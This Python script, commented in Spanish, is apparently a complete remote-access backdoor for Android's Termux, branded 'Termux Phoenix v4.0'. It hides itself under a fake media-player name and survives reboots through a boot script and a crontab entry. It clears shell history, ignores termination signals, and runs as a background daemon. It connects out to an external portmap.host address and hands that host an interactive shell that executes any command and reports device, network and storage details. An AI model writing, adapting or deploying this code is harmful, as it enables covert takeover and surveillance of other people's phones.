#!/usr/bin/env python3
"""
▓█████  ▒█████   ███▄ ▄███▓ ███▄ ▄███▓ ██▓███   ██▓     ██▓  ██████ 
▓█   ▀ ▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓██░  ██▒▓██▒    ▓██▒▒██    ▒ 
▒███   ▒██░  ██▒▓██    ▓██░▓██    ▓██░▓██░ ██▓▒▒██░    ▒██▒░ ▓██▄   
▒▓█  ▄ ▒██   ██░▒██    ▒██ ▒██    ▒██ ▒██▄█▓▒ ▒▒██░    ░██░  ▒   ██▒
░▒████▒░ ████▓▒░▒██▒   ░██▒▒██▒   ░██▒▒██▒ ░  ░░██████▒░██░▒██████▒▒
░░ ▒░ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒░▓  ░░▓  ▒ ▒▓▒ ▒ ░
 ░ ░  ░  ░ ▒ ▒░ ░  ░      ░░  ░      ░░▒ ░     ░ ░ ▒  ░ ▒ ░░ ░▒  ░ ░
   ░   ░ ░ ░ ▒  ░      ░   ░      ░   ░░         ░ ░    ▒ ░░  ░  ░  
   ░  ░    ░ ░         ░          ░                ░  ░ ░        ░  
                         PORTMAP.IO EDITION v4.0
"""

import os
import sys
import time
import socket
import subprocess
import random
import base64
import hashlib
import json
import threading
import signal
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# ==================== [CONFIGURACIÓN PORTMAP.IO] ====================
PORTMAP_CONFIG = {
    "host": "Astrazam-37147.portmap.host",
    "port": 37147,
    "local_port": 8081,
    "protocol": "tcp"
}

# Clave de encriptación (cambia esto por tu propia clave)
ENCRYPTION_KEY = base64.b64decode("9zX2Lk8PmQ7RvY1sW5tN3cF6aH4jB8gV0dC=")
IV = base64.b64decode("b2E3dHJ5dWk4KjIzNDU2Nzg=")

# ==================== [SISTEMA DE ENCRIPTACIÓN] ====================
class CryptoSystem:
    def __init__(self, key=ENCRYPTION_KEY, iv=IV):
        self.key = key
        self.iv = iv
        self.cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
    
    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        padded = pad(data, AES.block_size)
        encrypted = self.cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, data):
        encrypted = base64.b64decode(data)
        decrypted = self.cipher.decrypt(encrypted)
        return unpad(decrypted, AES.block_size).decode()

# ==================== [INSTALACIÓN OCULTA] ====================
class StealthInstaller:
    def __init__(self):
        self.app_name = "com.termux.media"
        self.hidden_dir = "/data/data/com.termux/files/home/.cache/.media"
        self.boot_dir = "/data/data/com.termux/files/home/.termux/boot"
        
    def install(self):
        """Instalación completa y oculta del agente"""
        print("[*] Iniciando instalación sigilosa...")
        
        # 1. Crear directorio oculto
        os.makedirs(self.hidden_dir, exist_ok=True)
        
        # 2. Copiar script
        script_path = os.path.join(self.hidden_dir, "media_player.py")
        with open(__file__, 'r') as src, open(script_path, 'w') as dst:
            dst.write(src.read())
        
        # 3. Hacer ejecutable
        os.chmod(script_path, 0o755)
        
        # 4. Crear servicio de arranque
        self.create_boot_service()
        
        # 5. Crear alias oculto
        self.create_hidden_alias()
        
        # 6. Limpiar huellas
        self.clean_traces()
        
        print(f"[+] Instalación completa. Ruta oculta: {self.hidden_dir}")
        return True
    
    def create_boot_service(self):
        """Servicio de arranque automático para Termux"""
        os.makedirs(self.boot_dir, exist_ok=True)
        
        boot_script = os.path.join(self.boot_dir, "media_start")
        with open(boot_script, 'w') as f:
            f.write(f'''#!/data/data/com.termux/files/usr/bin/bash
# Servicio de medios de Termux
sleep 30
while true; do
    {sys.executable} /data/data/com.termux/files/home/.cache/.media/media_player.py 2>/dev/null &
    sleep 60
done
''')
        os.chmod(boot_script, 0o755)
        
        # También crear entrada en crontab
        cron_cmd = f"@reboot sleep 45 && {sys.executable} {os.path.join(self.hidden_dir, 'media_player.py')} >/dev/null 2>&1\n"
        subprocess.run(['crontab', '-l'], capture_output=True)
        subprocess.run(['crontab', '-'], input=cron_cmd.encode())
    
    def create_hidden_alias(self):
        """Crear alias para control manual"""
        bashrc = "/data/data/com.termux/files/home/.bashrc"
        alias_cmd = "\nalias media-update='pip install --upgrade youtube-dl'\n"
        
        with open(bashrc, 'a') as f:
            f.write(alias_cmd)
    
    def clean_traces(self):
        """Limpiar huellas de instalación"""
        # Ocultar directorio
        os.system(f"attrib +h {self.hidden_dir} 2>/dev/null")
        
        # Limpiar historial
        os.system("history -c 2>/dev/null")
        os.system("rm -f ~/.bash_history 2>/dev/null")
        
        # Nombre de proceso falso
        with open("/proc/self/comm", "w") as f:
            f.write("mediaplayer")

# ==================== [CONEXIÓN PORTMAP.IO AVANZADA] ====================
class PortmapConnector:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = None
        self.connected = False
        
    def connect_with_retry(self, max_retries=10):
        """Conexión con múltiples reintentos y algoritmos"""
        retry_strategies = [
            self.direct_connect,
            self.dns_resolution_connect,
            self.proxy_connect,
            self.ssl_wrapped_connect
        ]
        
        for attempt in range(max_retries):
            print(f"[*] Intento de conexión {attempt + 1}/{max_retries}")
            
            for strategy in retry_strategies:
                try:
                    self.connection = strategy()
                    if self.connection:
                        self.connected = True
                        print(f"[+] Conexión exitosa via {strategy.__name__}")
                        return True
                except:
                    continue
            
            # Backoff exponencial con jitter
            delay = min(300, (2 ** attempt) + random.uniform(0, 5))
            print(f"[!] Esperando {delay:.1f}s antes de reintentar...")
            time.sleep(delay)
        
        return False
    
    def direct_connect(self):
        """Conexión directa al host"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((self.host, self.port))
        return sock
    
    def dns_resolution_connect(self):
        """Conexión con resolución DNS manual"""
        # Resolver IP manualmente
        ip = socket.gethostbyname(self.host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((ip, self.port))
        return sock
    
    def proxy_connect(self):
        """Intenta conexión a través de proxies comunes"""
        proxies = [
            ("localhost", 8080),
            ("127.0.0.1", 8080),
            ("10.0.0.1", 8080),
        ]
        
        for proxy_host, proxy_port in proxies:
            try:
                # Intentar conectar al proxy primero
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((proxy_host, proxy_port))
                
                # Enviar petición CONNECT (simplificada)
                connect_req = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n\r\n"
                sock.send(connect_req.encode())
                
                response = sock.recv(1024)
                if b"200" in response:
                    return sock
            except:
                continue
        
        return None
    
    def ssl_wrapped_connect(self):
        """Conexión con wrapper SSL"""
        try:
            import ssl
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # Crear contexto SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
            ssl_sock.connect((self.host, self.port))
            return ssl_sock
        except:
            return None

# ==================== [SHELL INTERACTIVA MEJORADA] ====================
class InteractiveTerminal:
    def __init__(self, connection):
        self.conn = connection
        self.cwd = os.getcwd()
        self.env = os.environ.copy()
        
    def start(self):
        """Inicia sesión interactiva"""
        # Enviar banner de conexión
        banner = self.get_system_info()
        self.conn.send(banner.encode())
        
        # Bucle principal
        while True:
            try:
                # Enviar prompt
                prompt = f"\n[phoenix@{socket.gethostname()} {self.cwd}]$ "
                self.conn.send(prompt.encode())
                
                # Recibir comando
                command = self.recv_data().strip()
                
                if not command:
                    continue
                
                # Comandos especiales
                if command == "exit":
                    break
                elif command.startswith("cd "):
                    self.change_directory(command[3:])
                    continue
                elif command == "background":
                    self.conn.send(b"[+] Entrando en modo background...\n")
                    return True
                
                # Ejecutar comando normal
                output = self.execute_command(command)
                self.conn.send(output.encode())
                
            except Exception as e:
                error_msg = f"[-] Error: {str(e)}\n"
                self.conn.send(error_msg.encode())
    
    def execute_command(self, cmd):
        """Ejecuta un comando del sistema"""
        try:
            # Preparar proceso
            proc = subprocess.Popen(
                cmd,
                shell=True,
                cwd=self.cwd,
                env=self.env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
            
            # Ejecutar con timeout
            try:
                stdout, stderr = proc.communicate(timeout=60)
            except subprocess.TimeoutExpired:
                proc.kill()
                return "[-] Timeout: Comando tardó demasiado\n"
            
            # Combinar salida
            output = ""
            if stdout:
                output += stdout
            if stderr:
                output += "\n" + stderr
            
            return output if output else "[+] Comando ejecutado (sin salida)\n"
            
        except Exception as e:
            return f"[-] Error ejecutando comando: {str(e)}\n"
    
    def change_directory(self, path):
        """Cambia el directorio de trabajo"""
        try:
            if path == "..":
                self.cwd = os.path.dirname(self.cwd)
            elif os.path.isabs(path):
                if os.path.isdir(path):
                    self.cwd = path
                else:
                    self.conn.send(f"[-] Directorio no existe: {path}\n".encode())
            else:
                new_path = os.path.join(self.cwd, path)
                if os.path.isdir(new_path):
                    self.cwd = new_path
                else:
                    self.conn.send(f"[-] Directorio no existe: {path}\n".encode())
        except Exception as e:
            self.conn.send(f"[-] Error cambiando directorio: {str(e)}\n".encode())
    
    def recv_data(self, timeout=30):
        """Recibe datos con timeout"""
        self.conn.settimeout(timeout)
        try:
            data = self.conn.recv(4096)
            return data.decode('utf-8', errors='ignore')
        except socket.timeout:
            return ""
    
    def get_system_info(self):
        """Obtiene información del sistema"""
        info = []
        info.append("\n" + "="*60)
        info.append("🚀 TERMUX PHOENIX v4.0 - CONEXIÓN ACTIVA")
        info.append("="*60)
        
        try:
            # Información básica
            hostname = socket.gethostname()
            user = os.getenv('USER', 'unknown')
            android_version = subprocess.getoutput('getprop ro.build.version.release')
            
            info.append(f"📱 Dispositivo: {hostname} (Android {android_version})")
            info.append(f"👤 Usuario: {user}")
            info.append(f"📂 Directorio: {self.cwd}")
            info.append(f"📶 Conexión: {PORTMAP_CONFIG['host']}:{PORTMAP_CONFIG['port']}")
            
            # Información de red
            ip_info = subprocess.getoutput('ip addr show wlan0 2>/dev/null || ip addr show')
            if 'inet ' in ip_info:
                for line in ip_info.split('\n'):
                    if 'inet ' in line and 'scope global' in line:
                        ip = line.split()[1].split('/')[0]
                        info.append(f"🌐 IP Local: {ip}")
                        break
            
            # Información de almacenamiento
            storage = subprocess.getoutput('df -h /data 2>/dev/null | tail -1')
            if storage:
                parts = storage.split()
                if len(parts) > 4:
                    info.append(f"💾 Almacenamiento: {parts[2]} usado, {parts[3]} libre")
            
        except:
            pass
        
        info.append("="*60)
        info.append("💡 Comandos especiales: 'background', 'exit', 'cd <dir>'")
        info.append("="*60 + "\n")
        
        return '\n'.join(info)

# ==================== [GESTOR DE PERSISTENCIA] ====================
class PersistenceManager:
    def __init__(self):
        self.checkpoints = []
        self.mutex = threading.Lock()
    
    def add_persistence_method(self, method_func):
        """Añade un método de persistencia"""
        with self.mutex:
            self.checkpoints.append(method_func)
    
    def install_all(self):
        """Instala todos los métodos de persistencia"""
        for method in self.checkpoints:
            try:
                method()
                time.sleep(1)
            except:
                pass
    
    def watchdog(self):
        """Perro guardián que verifica la conexión"""
        while True:
            time.sleep(300)  # Revisar cada 5 minutos
            
            # Verificar si el proceso principal está vivo
            pid = os.getpid()
            try:
                os.kill(pid, 0)
            except OSError:
                # Proceso muerto, reinstalar
                self.reinstall()
    
    def reinstall(self):
        """Reinstala el agente"""
        installer = StealthInstaller()
        installer.install()
        
        # Relanzar
        os.execv(sys.executable, [sys.executable, __file__])

# ==================== [MAIN - PUNTO DE ENTRADA] ====================
def main():
    # Señales para evitar cierre accidental
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    
    print("[*] Iniciando Termux Phoenix v4.0...")
    
    # 1. Instalación sigilosa
    installer = StealthInstaller()
    if not os.path.exists(installer.hidden_dir):
        installer.install()
    
    # 2. Configurar persistencia
    persistence = PersistenceManager()
    
    # 3. Conectar a Portmap.io
    connector = PortmapConnector(
        PORTMAP_CONFIG['host'],
        PORTMAP_CONFIG['port']
    )
    
    connection_established = False
    retry_count = 0
    
    while not connection_established and retry_count < 50:
        try:
            if connector.connect_with_retry(max_retries=3):
                connection_established = True
                
                # 4. Iniciar terminal interactiva
                terminal = InteractiveTerminal(connector.connection)
                terminal.start()
                
                # 5. Si se sale de la terminal, reintentar conexión
                print("[!] Conexión perdida, reintentando...")
                connector.connected = False
                connection_established = False
                
        except KeyboardInterrupt:
            print("\n[*] Interrupción recibida, saliendo...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
        
        retry_count += 1
        
        # Espera exponencial entre intentos
        wait_time = min(600, 5 * (2 ** retry_count))
        print(f"[*] Esperando {wait_time}s antes de reintentar...")
        time.sleep(wait_time)
    
    print("[!] Máximo de reintentos alcanzado. El agente permanecerá inactivo.")

def daemonize():
    """Convertir en demonio/background"""
    # Primer fork
    pid = os.fork()
    if pid > 0:
        sys.exit(0)
    
    # Crear nueva sesión
    os.setsid()
    
    # Segundo fork
    pid = os.fork()
    if pid > 0:
        sys.exit(0)
    
    # Redirigir E/S estándar
    sys.stdout = open('/dev/null', 'w')
    sys.stderr = open('/dev/null', 'w')
    sys.stdin = open('/dev/null', 'r')
    
    # Cambiar directorio de trabajo
    os.chdir('/')
    
    # Ejecutar main
    main()

if __name__ == "__main__":
    # Verificar si estamos en Termux
    if not os.path.exists('/data/data/com.termux'):
        print("[-] Este script solo funciona en Termux")
        sys.exit(1)
    
    # Verificar argumentos
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        installer = StealthInstaller()
        installer.install()
        print("[+] Instalación completada. El agente se ejecutará en background.")
        sys.exit(0)
    
    # Ejecutar como demonio
    daemonize()
